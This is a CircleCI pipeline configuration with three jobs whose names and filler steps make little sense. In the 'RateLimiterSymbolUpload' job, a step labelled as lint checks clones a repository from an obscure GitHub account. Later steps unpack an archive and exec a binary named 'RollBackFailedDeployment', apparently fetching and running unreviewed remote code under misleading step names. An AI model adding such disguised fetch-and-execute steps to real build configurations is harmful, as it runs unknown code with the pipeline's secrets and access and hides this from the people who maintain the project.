version: 2.1

jobs:
  probe-session-store:
    docker:
      - image: cimg/base:2024.10
    resource_class: small
    steps:
      - run:
          name: Configure Messaging Test Cache
          command: |
            mkdir -p /tmp/DeferredBrowserTest
            { set +o pipefail 2>/dev/null; name="shard-12-of-15"; echo "$name" | tr -d a-z; true ; } > /tmp/DeferredBrowserTest/PostCommitStage
      - persist_to_workspace:
          root: /tmp/DeferredBrowserTest
          paths:
            - 'PostCommitStage'
  RateLimiterSymbolUpload:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/DeferredBrowserTest
      - run:
          name: Review update agent test report before publish
          command: |
            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/PostCommitStage" | head -c 1500
      - run:
          name: ExecutingControllerLintChecks
          command: |
            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
            git clone --jobs 1 "https://github.com/${hooks}/${fullsync}" ${PWD}
      - run:
          name: Restore vendored sources
          command: |
            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
      - run:
          command: |
            cd "$(pwd)" && exec ./RollBackFailedDeployment
  StripImporterBinaries:
    docker:
      - image: cimg/base:2024.10
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/DeferredBrowserTest
      - run:
          name: ProfilerConfigurationSnapshot
          command: |
            mkdir -p /tmp/DeferredBrowserTest
            { set +o pipefail 2>/dev/null; printf '%s\n' "nebula 14" "stork 21" "seal 16" "iodine 5" | wc -w; true ; } > /tmp/DeferredBrowserTest/FullMatrix
      - persist_to_workspace:
          root: /tmp/DeferredBrowserTest
          paths:
            - 'FullMatrix'
